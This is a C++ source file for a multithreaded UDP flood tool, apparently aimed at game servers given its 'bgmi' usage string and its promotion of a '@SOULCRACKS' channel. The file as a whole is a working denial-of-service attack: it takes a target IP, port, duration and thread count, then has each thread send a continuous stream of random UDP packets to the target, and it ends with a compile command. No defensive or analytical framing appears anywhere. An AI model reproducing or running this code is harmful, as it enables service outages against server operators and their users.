#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h>
#endif

#define PAYLOAD_SIZE 20
class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void generate_payload(char *buffer, size_t size) {
        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';
            buffer[i * 4 + 1] = 'x';
            buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
            buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
        }
        buffer[size * 4] = '\0';
    }

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime;
        
        char payload[PAYLOAD_SIZE * 4 + 1];
        generate_payload(payload, PAYLOAD_SIZE);

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        endtime = time(NULL) + duration;
        while (time(NULL) <= endtime) {
            ssize_t payload_size = strlen(payload);
            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }

        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
};

void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    exit(0);
}

void usage() {
    std::cout << "Usage: ./bgmi ip port duration threads\n";
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    std::signal(SIGINT, handle_sigint);

    std::vector<pthread_t> thread_ids(threads);
    std::vector<std::unique_ptr<Attack>> attacks;

    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";

    for (int i = 0; i < threads; i++) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration));
        
        if (pthread_create(&thread_ids[i], NULL, [](void* arg) -> void* {
            Attack* attack = static_cast<Attack*>(arg);
            attack->attack_thread();
            return nullptr;
        }, attacks[i].get()) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        std::cout << "Launched thread with ID: " << thread_ids[i] << "\n";
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    std::cout << "Attack finished. Join @SOULCRACKS\n";
    return 0;
}
//g++ -std=c++14 soulcracks.cpp -o soul -pthread